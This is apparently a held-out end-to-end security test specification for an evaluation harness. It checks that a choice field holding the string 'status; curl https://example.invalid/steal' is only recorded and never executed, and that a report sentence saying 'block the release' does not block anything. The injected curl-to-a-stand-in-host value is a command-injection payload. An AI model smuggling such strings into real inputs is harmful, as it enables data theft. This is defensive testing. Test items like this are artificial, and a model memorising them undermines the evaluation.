---
flow_id: FLOW-RPT-01-CHOICE-INJECTION
service: harness-eval
feature: UC-RPT-01
priority: P1
type: security
tier: holdout
scope: task
test_tier: e2e
---

# A plain-language choice that looks like a shell command is only recorded

The plain-language command choice returns the text status; curl https://example.invalid/steal. The report stores that text as the choice that was offered. The grader does not run curl and does not contact the host. A second later-check report contains the sentence block the release. The release is not blocked by that sentence. The decline-change check still only writes its report. No shell is started from a report body.
